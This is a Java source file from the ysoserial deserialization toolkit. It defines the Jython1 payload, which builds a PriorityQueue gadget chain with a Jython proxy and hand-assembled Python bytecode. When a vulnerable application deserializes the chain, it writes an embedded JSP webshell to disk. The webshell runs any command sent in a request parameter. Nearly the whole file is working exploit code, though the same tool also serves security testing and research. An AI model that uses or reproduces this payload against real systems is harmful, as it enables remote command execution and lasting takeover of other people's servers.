package ysoserial.payloads;

import org.python.core.*;

import java.io.*;
import java.math.BigInteger;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@PayloadTest(skip="non RCE")
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.python:jython-standalone:2.5.2" })
public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
    public PriorityQueue getObject(String path) throws Exception {

        // Set payload parameters
        String webshell= "<%@ page import=\"java.util.*,java.io.*\"%>\n" +
            "<html><body><form method=\"GET\" name=\"myform\" action=\"\">\n" +
            "<input type=\"text\" name=\"cmd\">\n" +
            "<input type=\"submit\" value=\"Send\">\n" +
            "</form>\n" +
            "<pre>\n" +
            "<%\n" +
            "if (request.getParameter(\"cmd\") != null) {\n" +
                    "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<br>\");\n" +
                    "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n" +
                    "OutputStream os = p.getOutputStream();\n" + 
                    "InputStream in = p.getInputStream();\n" +
                    "DataInputStream dis = new DataInputStream(in);\n" +
                    "String disr = dis.readLine();\n" +
                    "while ( disr != null ) {\n" +
                            "out.println(disr);\n" +
                            "disr = dis.readLine();\n" + 
                    "}\n" +
            "}\n" +
            "%>\n" +
            "</pre></body></html>";

        // Python bytecode to write a file on disk
        String code =
            "740000" + // 0 LOAD_GLOBAL              0 (open)
            "640100" + // 3 LOAD_CONST               1 (<PATH>)
            "640200" + // 6 LOAD_CONST               2 ('w')
            "830200" + // 9 CALL_FUNCTION            2
            "690100" + // 12 LOAD_ATTR               1 (write)  ??
            "640300" + // 15 LOAD_CONST              3 (<webshell>)
            "830100" + // 18 CALL_FUNCTION           1
            "01"     + // 21 POP_TOP
            "640000" + // 22 LOAD_CONST
            "53";      // 25 RETURN_VALUE

        // Helping consts and names
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w"), new PyString(webshell)};
        String[] names = new String[]{"open", "write"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{}, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        // Create a PyFunction Invocation handler that will call our python bytecode when intercepting any method
        PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);

        // Prepare Trigger Gadget
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }
 
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jython1.class, args);
    }
}
